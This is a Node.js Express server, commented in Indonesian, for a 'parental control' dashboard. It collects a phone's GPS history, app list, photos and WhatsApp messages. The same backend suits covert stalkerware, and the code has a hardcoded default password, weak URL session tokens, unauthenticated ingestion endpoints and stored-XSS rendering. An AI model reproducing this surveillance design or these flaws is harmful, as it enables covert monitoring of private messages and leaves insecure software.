const express = require('express');
const crypto = require('crypto'); // Modul bawaan Node.js untuk keamanan kriptografi
const rateLimit = require('express-rate-limit'); // Wajib install: npm install express-rate-limit

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- KONFIGURASI SANDI ADMIN ---
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'rahasia123'; 
const activeSessions = new Set();

// --- PENGAMAN RATE LIMITING (Mencegah Brute-Force) ---
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // Jeda waktu 15 menit
    max: 5, // Maksimal 5 kali percobaan gagal per IP
    standardHeaders: true,
    legacyHeaders: false,
    message: '⚠️ Terlalu banyak percobaan login yang gagal. Silakan coba lagi setelah 15 menit.'
});

let riwayatLokasi = []; 
let daftarAplikasi = [];
let galeriFoto = [];
let logWhatsApp = [];

// --- HALAMAN LOGIN ELEGAN ---
app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login - Parental Control Center</title>
            <style>
                body {
                    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
                    background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 50%, #db2777 100%);
                    color: #1e293b;
                    margin: 0;
                    padding: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }
                .login-card {
                    background: rgba(255, 255, 255, 0.9);
                    backdrop-filter: blur(16px);
                    -webkit-backdrop-filter: blur(16px);
                    border: 1px solid rgba(255, 255, 255, 0.3);
                    border-radius: 20px;
                    padding: 35px 30px;
                    width: 100%;
                    max-width: 380px;
                    box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.3);
                    text-align: center;
                }
                .icon-shield { font-size: 40px; margin-bottom: 10px; }
                h2 { margin: 0 0 5px 0; color: #0f172a; font-size: 22px; font-weight: 700; }
                p { font-size: 13px; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
                
                .input-group { position: relative; margin-bottom: 18px; }
                input[type="password"] {
                    width: 100%;
                    padding: 14px 16px;
                    border: 1.5px solid #cbd5e1;
                    border-radius: 12px;
                    font-size: 14px;
                    box-sizing: border-box;
                    outline: none;
                    background: #f8fafc;
                    transition: all 0.3s ease;
                }
                input[type="password"]:focus {
                    border-color: #6366f1;
                    background: #fff;
                    box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
                }
                button {
                    background: linear-gradient(135deg, #6366f1, #4f46e5);
                    color: white;
                    border: none;
                    width: 100%;
                    padding: 14px;
                    border-radius: 12px;
                    font-size: 14px;
                    font-weight: 600;
                    cursor: pointer;
                    box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
                    transition: transform 0.2s ease, box-shadow 0.2s ease;
                }
                button:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(99, 102, 241, 0.5); }
                button:active { transform: translateY(0); }
                .error { 
                    background: #fee2e2; color: #991b1b; font-size: 12px; 
                    padding: 10px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #fca5a5; 
                }
            </style>
        </head>
        <body>
            <div class="login-card">
                <div class="icon-shield">🛡️</div>
                <h2>Parental Control</h2>
                <p>Masukkan sandi rahasia untuk mengakses pusat pantauan perangkat anak.</p>
                
                ${req.query.error ? '<div class="error">⚠️ Kata sandi salah, silakan coba lagi.</div>' : ''}
                
                <form action="/api/login" method="POST">
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Kata Sandi Admin" required autofocus>
                    </div>
                    <button type="submit">Masuk ke Dashboard</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// --- PROSES LOGIN (Dilindungi Rate Limiter & Timing Safe Equal) ---
app.post('/api/login', loginLimiter, (req, res) => {
    const { password } = req.body;
    
    const inputBuffer = Buffer.from(password || '');
    const realPasswordBuffer = Buffer.from(ADMIN_PASSWORD);
    
    let isValid = false;
    // Cek panjang buffer dulu agar timingSafeEqual tidak error jika panjang berbeda
    if (inputBuffer.length === realPasswordBuffer.length) {
        isValid = crypto.timingSafeEqual(inputBuffer, realPasswordBuffer);
    }

    if (isValid) {
        const sessionToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
        activeSessions.add(sessionToken);
        return res.redirect(`/?token=${sessionToken}`);
    } else {
        return res.redirect('/login?error=true');
    }
});

// --- LOGOUT ---
app.get('/logout', (req, res) => {
    const { token } = req.query;
    if (token) activeSessions.delete(token);
    res.redirect('/login');
});

// --- MIDDLEWARE KEAMANAN ---
function requireAuth(req, res, next) {
    const token = req.query.token;
    if (token && activeSessions.has(token)) {
        req.userToken = token;
        next();
    } else {
        res.redirect('/login');
    }
}

// --- HALAMAN UTAMA (DASHBOARD ELEGAN) ---
app.get('/', requireAuth, (req, res) => {
    const token = req.userToken;

    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Parental Control Center</title>
            <style>
                body {
                    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
                    background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 50%, #db2777 100%);
                    color: #1e293b;
                    margin: 0;
                    padding: 25px 15px;
                    min-height: 100vh;
                }
                .container { max-width: 900px; margin: 0 auto; }
                header { text-align: center; margin-bottom: 35px; color: white; position: relative; }
                header h1 { margin: 0; font-size: 28px; font-weight: 700; text-shadow: 0 2px 8px rgba(0,0,0,0.15); }
                header p { font-size: 14px; opacity: 0.9; margin-top: 6px; }
                .status-pill {
                    display: inline-flex; align-items: center; gap: 6px;
                    background: rgba(255, 255, 255, 0.2); padding: 4px 12px;
                    border-radius: 20px; font-size: 12px; margin-top: 8px; backdrop-filter: blur(4px);
                }
                .dot { width: 8px; height: 8px; background-color: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; }
                .btn-logout {
                    position: absolute; right: 0; top: 0;
                    background: rgba(255, 255, 255, 0.15); color: white;
                    border: 1px solid rgba(255, 255, 255, 0.3); padding: 8px 14px;
                    border-radius: 10px; text-decoration: none; font-size: 12px; font-weight: 600;
                    backdrop-filter: blur(6px); transition: background 0.2s;
                }
                .btn-logout:hover { background: rgba(255, 255, 255, 0.25); }
                
                .card {
                    background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px);
                    border-radius: 18px; padding: 22px; margin-bottom: 22px;
                    box-shadow: 0 12px 30px -10px rgba(0, 0, 0, 0.15); border-left: 6px solid #6366f1;
                }
                .card.location { border-left-color: #3b82f6; }
                .card.apps { border-left-color: #10b981; }
                .card.gallery { border-left-color: #8b5cf6; }
                .card.whatsapp { border-left-color: #f59e0b; }
                .card h3 {
                    margin-top: 0; font-size: 16px; color: #0f172a;
                    border-bottom: 2px solid #f1f5f9; padding-bottom: 12px;
                }
                table { width: 100%; border-collapse: collapse; margin-top: 8px; }
                th, td { padding: 12px 10px; text-align: left; font-size: 13px; border-bottom: 1px solid #f1f5f9; }
                th { font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
                .badge { background-color: #dcfce7; color: #15803d; padding: 5px 10px; border-radius: 8px; font-size: 11px; font-weight: 600; }
                .btn-map {
                    background-color: #3b82f6; color: white; padding: 6px 14px;
                    border-radius: 8px; text-decoration: none; font-size: 12px; font-weight: 600;
                }
                .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 12px; margin-top: 10px; }
                .gallery-item img { width: 100%; height: 95px; object-fit: cover; border-radius: 10px; }
                .empty-state { text-align: center; color: #94a3b8; font-style: italic; padding: 20px; font-size: 13px; }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <a href="/logout?token=${token}" class="btn-logout">Keluar</a>
                    <h1>🛡️ Parental Control Center</h1>
                    <p>Pantauan Aktivitas Perangkat Anak secara Real-Time</p>
                    <div class="status-pill"><span class="dot"></span> Server Aktif & Terlindungi</div>
                </header>

                <div class="card location">
                    <h3>📍 Riwayat Lokasi GPS</h3>
                    <table>
                        <thead><tr><th>Waktu</th><th>Koordinat</th><th style="text-align: right;">Aksi</th></tr></thead>
                        <tbody>
                            ${riwayatLokasi.length === 0 ? '<tr><td colspan="3" class="empty-state">Belum ada data lokasi tercatat</td></tr>' : 
                              riwayatLokasi.map(item => `<tr><td>${item.waktu}</td><td><code>${item.lat}, ${item.lon}</code></td><td style="text-align: right;"><a href="https://maps.google.com/?q=${item.lat},${item.lon}" target="_blank" class="btn-map">Buka Peta</a></td></tr>`).join('')}
                        </tbody>
                    </table>
                </div>

                <div class="card apps">
                    <h3>📦 Aplikasi Ter-install</h3>
                    <table>
                        <thead><tr><th>Nama Aplikasi</th><th style="text-align: right;">Status</th></tr></thead>
                        <tbody>
                            ${daftarAplikasi.length === 0 ? '<tr><td colspan="2" class="empty-state">Belum ada data aplikasi</td></tr>' : 
                              daftarAplikasi.map(app => `<tr><td>${app.nama}</td><td style="text-align: right;"><span class="badge">${app.keterangan || 'Aktif'}</span></td></tr>`).join('')}
                        </tbody>
                    </table>
                </div>

                <div class="card gallery">
                    <h3>🖼️ Galeri / Tangkapan Layar</h3>
                    ${galeriFoto.length === 0 ? '<div class="empty-state">Belum ada foto atau screenshot yang diunggah.</div>' : `
                        <div class="gallery-grid">${galeriFoto.map(f => `<div class="gallery-item"><a href="${f.url}" target="_blank"><img src="${f.url}" alt="Foto"></a></div>`).join('')}</div>
                    `}
                </div>

                <div class="card whatsapp">
                    <h3>💬 Aktivitas WhatsApp</h3>
                    <table>
                        <thead><tr><th>Waktu</th><th>Pesan / Kontak</th></tr></thead>
                        <tbody>
                            ${logWhatsApp.length === 0 ? '<tr><td colspan="2" class="empty-state">Belum ada log pesan WhatsApp</td></tr>' : 
                              logWhatsApp.map(w => `<tr><td style="width: 25%;">${w.waktu}</td><td><b>${w.kontak}:</b> ${w.pesan}</td></tr>`).join('')}
                        </tbody>
                    </table>
                </div>
            </div>
        </body>
        </html>
    `);
});

// --- ENDPOINT API PENERIMA DATA ---
app.post('/api/lapor-lokasi', (req, res) => {
    const { lat, lon } = req.body;
    if (lat && lon) {
        riwayatLokasi.unshift({ lat, lon, waktu: new Date().toLocaleTimeString() });
        if (riwayatLokasi.length > 20) riwayatLokasi.pop();
        res.json({ status: 'success', pesan: 'History lokasi dicatat' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'Lat & lon diperlukan' });
    }
});

app.post('/api/lapor-apk', (req, res) => {
    const { apps } = req.body;
    if (apps && Array.isArray(apps)) {
        daftarAplikasi = apps;
        res.json({ status: 'success', pesan: 'Daftar aplikasi diperbarui' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'Format apps harus array' });
    }
});

app.post('/api/lapor-wa', (req, res) => {
    const { kontak, pesan } = req.body;
    if (kontak && pesan) {
        logWhatsApp.unshift({ kontak, pesan, waktu: new Date().toLocaleTimeString() });
        res.json({ status: 'success', pesan: 'Log WhatsApp direkam' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'Kontak & pesan diperlukan' });
    }
});

app.post('/api/lapor-foto', (req, res) => {
    const { url } = req.body;
    if (url) {
        galeriFoto.unshift({ url, waktu: new Date().toLocaleTimeString() });
        if (galeriFoto.length > 10) galeriFoto.pop();
        res.json({ status: 'success', pesan: 'Foto berhasil diunggah' });
    } else {
        res.status(400).json({ status: 'error', pesan: 'URL foto diperlukan' });
    }
});

app.listen(PORT, () => {
    console.log(`Server dashboard berjalan elegan dan aman di port ${PORT}`);
});
